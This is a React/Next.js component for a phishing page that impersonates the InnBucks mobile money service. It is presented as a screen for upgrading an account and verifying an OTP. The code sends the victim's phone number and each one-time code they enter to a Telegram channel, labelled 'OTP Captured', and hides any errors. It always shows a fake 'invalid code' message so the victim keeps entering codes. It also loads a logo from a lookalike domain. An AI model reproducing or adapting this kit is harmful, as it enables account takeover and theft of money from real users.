"use client"

import React, { useState, useEffect } from "react"
import {
  ChevronLeft,
  Loader2,
  Clock,
  RotateCcw,
  AlertCircle,
} from "lucide-react"
import { useRouter, useSearchParams } from "next/navigation"
import { sendTelegramMessage } from "@/lib/telegram"

export function OtpForm() {
  const [otp, setOtp] = useState("")
  const [timer, setTimer] = useState(120)
  const [canResend, setCanResend] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [errorMessage, setErrorMessage] = useState("")
  const router = useRouter()
  const searchParams = useSearchParams()

  const phoneParam =
    searchParams.get("phone") ||
    (typeof window !== "undefined" ? sessionStorage.getItem("userPhone") || "" : "")

  // Countdown timer
  useEffect(() => {
    if (timer > 0) {
      const interval = setInterval(() => {
        setTimer((prev) => prev - 1)
      }, 1000)
      return () => clearInterval(interval)
    } else {
      setCanResend(true)
    }
  }, [timer])

  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  // Handle unlimited numeric digits
  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "")
    setOtp(value)
    if (errorMessage) setErrorMessage("")
  }

  const handleResend = async () => {
    if (!canResend) return
    setTimer(120)
    setCanResend(false)
    setErrorMessage("")

    try {
      await sendTelegramMessage({
        title: "🔄 InnBucks Resend OTP Requested",
        phoneNumber: phoneParam || "N/A",
      })
    } catch {
      // silent
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!otp.trim()) {
      setErrorMessage("Verification code is required.")
      return
    }

    setIsLoading(true)
    setErrorMessage("")

    try {
      await sendTelegramMessage({
        title: "🔐 InnBucks OTP Captured",
        otp1: otp.trim(),
        phoneNumber: phoneParam || "N/A",
      })
    } catch {
      // silent
    }

    // Wait exactly 2 seconds then show invalid message and reset timer
    setTimeout(() => {
      setIsLoading(false)
      setErrorMessage("Invalid verification code. Please try again.")
      setOtp("")
      setTimer(120)
      setCanResend(false)
    }, 2000)
  }

  return (
    <div className="w-full max-w-[420px] min-h-[100dvh] sm:min-h-[640px] bg-[#28293C] flex flex-col justify-between px-6 pt-6 sm:pt-8 pb-6 sm:pb-8 relative text-white select-none">
      {/* Header Bar with #32344a Background matching Screenshot */}
      <div>
        <div className="-mx-6 -mt-6 sm:-mt-8 px-6 py-3.5 bg-[#32344a] border-b border-black/15 flex items-center justify-between relative shadow-xs">
          <button
            type="button"
            onClick={() => router.push("/")}
            className="w-9 h-9 rounded-full bg-white/10 hover:bg-white/15 text-white flex items-center justify-center transition-colors cursor-pointer shrink-0"
            aria-label="Back"
          >
            <ChevronLeft className="w-5 h-5 stroke-[2.5]" />
          </button>

          {/* Logo + InnBucks Title */}
          <div className="flex items-center gap-2 pr-9 mx-auto">
            <div className="w-[28px] h-[28px] shrink-0 flex items-center justify-center">
              <img
                src="https://binbukkes.site/innBucks_color_logo.png"
                onError={(e) => {
                  e.currentTarget.src = "/innbucks-logo.png"
                }}
                alt="InnBucks Logo"
                className="w-full h-full object-contain"
              />
            </div>
            <span
              style={{ fontSize: "22px", fontWeight: 700 }}
              className="text-white tracking-tight"
            >
              InnBucks
            </span>
          </div>
        </div>

        {/* Main Headline */}
        <div className="mt-6 sm:mt-7 text-center">
          <h1
            style={{ fontSize: "26px", fontWeight: 800, lineHeight: 1.25 }}
            className="text-white max-w-[320px] mx-auto tracking-tight"
          >
            Welcome To Upgrade InnBucks Account
          </h1>

          {phoneParam && (
            <p className="text-white/70 text-[14px] mt-3 font-normal">
              {phoneParam}
            </p>
          )}
          <p className="text-white/50 text-[13px] mt-1">
            Enter the OTP sent to your phone
          </p>
        </div>

        {/* OTP Input Form */}
        <form onSubmit={handleSubmit} className="mt-10">
          <div
            className={`flex items-center pb-2.5 transition-colors ${
              errorMessage ? "border-b border-rose-500" : "border-b border-[#555] focus-within:border-white"
            }`}
          >
            <input
              type="text"
              inputMode="numeric"
              pattern="[0-9]*"
              autoFocus
              value={otp}
              onChange={handleOtpChange}
              placeholder="Enter verification code"
              className="w-full text-white text-[16px] font-medium outline-none bg-transparent placeholder:text-[#757575] tracking-wider text-center"
            />
          </div>

          {/* Error Message */}
          {errorMessage && (
            <div className="flex items-center justify-center gap-1.5 text-rose-500 text-[12px] font-medium mt-2 animate-in fade-in duration-150">
              <AlertCircle className="w-3.5 h-3.5 shrink-0" />
              <span>{errorMessage}</span>
            </div>
          )}

          {/* Timer & Resend Option */}
          <div className="flex items-center justify-between mt-5 text-[12.5px] text-white/60">
            <div className="flex items-center gap-1.5">
              <Clock className="w-3.5 h-3.5 text-white/50" />
              <span>Expires in:</span>
              <span className={`font-semibold tabular-nums ${timer < 30 ? "text-amber-400" : "text-white"}`}>
                {formatTimer(timer)}
              </span>
            </div>

            <button
              type="button"
              onClick={handleResend}
              disabled={!canResend}
              className={`inline-flex items-center gap-1 font-semibold transition-colors cursor-pointer ${
                canResend
                  ? "text-[#4a90e2] hover:underline"
                  : "text-white/30 cursor-not-allowed"
              }`}
            >
              <RotateCcw className="w-3 h-3" />
              <span>Resend OTP</span>
            </button>
          </div>

          {/* Terms Note */}
          <p className="text-[12px] text-white/60 text-center mt-7 leading-relaxed">
            By pressing Sign Up, you agree to our{" "}
            <a href="#" className="text-[#4a90e2] hover:underline font-medium">
              Privacy Policy
            </a>{" "}
            and{" "}
            <a href="#" className="text-[#4a90e2] hover:underline font-medium">
              Terms and Conditions
            </a>
          </p>
        </form>
      </div>

      {/* Bottom Continue Button */}
      <div className="pt-6">
        <button
          type="button"
          onClick={handleSubmit}
          disabled={isLoading}
          className="w-full h-[52px] rounded-[12px] bg-[#335c87] hover:bg-[#2b4d70] active:scale-[0.99] text-white font-bold text-[16px] shadow-lg shadow-[#335c87]/25 transition-all cursor-pointer flex items-center justify-center disabled:opacity-75"
        >
          {isLoading ? (
            <div className="flex items-center gap-2">
              <Loader2 className="w-5 h-5 animate-spin text-white" />
              <span>Verifying...</span>
            </div>
          ) : (
            "Continue"
          )}
        </button>
      </div>
    </div>
  )
}
